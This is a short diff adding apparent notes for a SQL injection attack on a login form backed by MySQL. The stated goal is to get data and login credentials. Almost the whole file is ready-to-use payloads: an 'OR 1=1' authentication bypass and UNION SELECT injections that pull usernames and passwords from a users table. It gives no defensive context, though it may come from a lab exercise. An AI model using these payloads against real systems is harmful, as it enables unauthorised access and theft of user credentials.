@@ -1,0 +1,10 @@
+Goal - to get data and login / password for mysql server
+
+1) access to data:
+    login: login' OR 1=1; #
+    password: any
+2) access to users table:
+    login: ' union select login from users order by 1 DESC; #
+    or
+    ' union select pass from users order by 1 DESC; #
+    password: any
